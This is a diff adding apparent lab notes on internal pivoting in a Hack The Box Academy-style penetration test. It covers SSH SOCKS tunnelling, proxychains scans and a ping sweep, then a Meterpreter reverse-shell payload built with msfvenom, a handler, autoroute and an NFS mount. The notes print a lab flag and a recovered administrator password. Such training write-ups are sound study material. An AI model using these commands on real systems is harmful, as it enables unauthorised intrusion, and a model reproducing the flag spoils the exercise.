@@ -1,1 +1,150 @@
+We've covered a ton of ground so far:
+
+Performed external information gathering
+Performed external port and service scanning
+Enumerated multiple services for misconfigurations and known vulnerabilities
+Enumerated and attacked 12 different web applications, with some resulting in no access, others granting file read or sensitive data access, and a few resulting in remote code execution on the underlying web server
+Obtained a hard-fought foothold in the internal network
+Performed pillaging and lateral movement to gain access as a more privileged user
+Escalated privileges to root on the web server
+Established persistence through the use of both a user/password pair and the root account's private key for fast SSH access back into the environment
+Setting Up Pivoting - SSH
+With a copy of the root id_rsa (private key) file, we can use SSH port forwarding along with ProxyChains to start getting a picture of the internal network. To review this technique, check out the Dynamic Port Forwarding with SSH and SOCKS Tunneling section of the Pivoting, Tunneling, and Port Forwarding module.
+
+We can use the following command to set up our SSH pivot using dynamic port forwarding: ssh -D 8081 -i dmz01_key root@10.129.x.x. This means we can proxy traffic from our attack host through port 8081 on the target to reach hosts inside the 172.16.8.0/23 subnet directly from our attack host.
+
+In our first terminal, let's set up the SSH dynamic port forwarding command first:
+
+SYNTAX: MJBUCKNER@htb[/htb]$ ssh -D 8081 -i rootkey root@10.129.203.111
+
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 22 Jun 2022 12:08:31 AM UTC
+
+  System load:                      0.21
+  Usage of /:                       99.9% of 13.72GB
+  Memory usage:                     65%
+  Swap usage:                       0%
+  Processes:                        458
+  Users logged in:                  2
+  IPv4 address for br-65c448355ed2: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for ens160:          10.129.203.111
+  IPv6 address for ens160:          dead:beef::250:56ff:feb9:d30d
+  IPv4 address for ens192:          172.16.8.120
+
+  => / is using 99.9% of 13.72GB
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+97 updates can be applied immediately.
+30 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Once in 
+
+Next, we can use Nmap with Proxychains to scan the dmz01 host on its' second NIC, with the IP address 172.16.8.120 to ensure everything is set up correctly.
+
+  Internal Information Gathering
+HOST SYNTAX: MJBUCKNER@htb[/htb]$ proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 21:15 EDT
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:80-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:80-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:22-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:21-<><>-OK
+|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.120:8080-<><>-OK
+Nmap scan report for 172.16.8.120
+Host is up (0.13s latency).
+
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
+
+
+
+
+
+
+Host Discovery - 172.16.8.0/23 Subnet - SSH Tunnel
+Alternatively, we could do a ping sweep or use a static Nmap binary from the dmz01 host.
+
+We get quick results with this Bash one-liner ping sweep:
+
+Syntax: root@dmz01:~# for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
+
+
+You have mail.
+Last login: Tue Jun 21 19:53:01 2022 from 10.10.14.15
+root@dmz01:~#
+
+
+
+
+ANYWAY thuis is a horribly explained room once more but ima go through it. 
+
+
+
+so i triplechecked proxychains was set up correctly and even tried socks5... when runnign the nmap command it failed everytime... so i just said fuck it and went BRRRRRR weith meterpreter.. 
+
+
+
+
+Question -  Mount an NFS share and find a flag.txt file. Submit the contents as your answer. 
+
+
+1) ssh -D 9050 root@10.129.248.159 -i rootkety 
+2) try proxychains nmap -> fails. proxychains showmount -e 172.16.8.20 works though? and we found /DEV01 
+3) in the SSH shell i ran -> for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from 
+4) output 
+64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms
+64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms
+64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms
+64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms 
+5) so we have 4 other hosts.. this time i went to meterpreter.. 
+6) on KALI HOST -> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.98 LPORT=4443 -f elf > shell.elf
+7) ON KALI: scp -i rootkey shell.elf root@10.129.248.159:/tmp
+8) once copied to ssh shell run this on KALI!! 
+sudo msfconsole -q
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 10.10.15.98
+set LPORT 4443
+run
+
+9) ON SSH SESSION: 
+cd /tmp/
+chmod +x shell.elf
+./shell.elf
+
+10) catch shell and background it -> 
+bg 
+use post/multi/manage/autoroute
+set SESSION 1
+set SUBNET 172.16.8.0
+run
+
+11) you can terminate ./shell.elf on root ssh and then run this -> 
+
+mkdir DEV01
+mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01/
+cat DEV01/flag.txt - bf22a1d0acfca4af517e1417a80e92d1
+
+can also enumerate further:
+root@dmz01:/tmp/DEV01# cat DNN/web.config 
+Administrator:D0tn31Nuk3R0ck$$@123 
+
+
 
